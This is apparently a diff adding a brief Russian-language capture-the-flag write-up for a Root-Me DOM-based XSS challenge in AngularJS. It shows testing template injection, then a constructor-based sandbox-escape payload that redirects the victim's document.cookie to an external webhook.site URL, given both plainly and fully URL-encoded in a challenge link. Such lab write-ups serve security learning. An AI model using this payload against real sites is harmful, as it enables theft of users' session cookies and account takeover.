@@ -1,1 +1,10 @@
+<--https://www.root-me.org/fr/Challenges/Web-Client/XSS-DOM-Based-AngularJS-->
 
+1. Первое, что я нашел, это то, что фреймворк исполняет код в {{здесь}}, соотетственно этим можно убедиться отправив в форме {{2+2}} и на выходе получить 4
+2. Поресерча интернет (гитхаб репозиторий с PoC Angular разных версий - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md), 
+   находиться payload, который дает выполнять JS-код:
+   {{constructor.constructor('alert(1)')()}}
+3. Учитывая, что одинарные кавычки убираются, заменяем их на двойные либо на `. Конечный payload будет:
+   {{constructor.constructor("window.location.href=`https://webhook.site/3a03bfae-c84f-4579-9357-5a1b288d82f2?flag=${document.cookie}`")()}}
+   Оставшаяся ссылка это:
+   http://challenge01.root-me.org/web-client/ch35/?name=%7b%7b%63%6f%6e%73%74%72%75%63%74%6f%72%2e%63%6f%6e%73%74%72%75%63%74%6f%72%28%22%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%3d%60%68%74%74%70%73%3a%2f%2f%77%65%62%68%6f%6f%6b%2e%73%69%74%65%2f%33%61%30%33%62%66%61%65%2d%63%38%34%66%2d%34%35%37%39%2d%39%33%35%37%2d%35%61%31%62%32%38%38%64%38%32%66%32%3f%66%6c%61%67%3d%24%7b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%7d%60%22%29%28%29%7d%7d
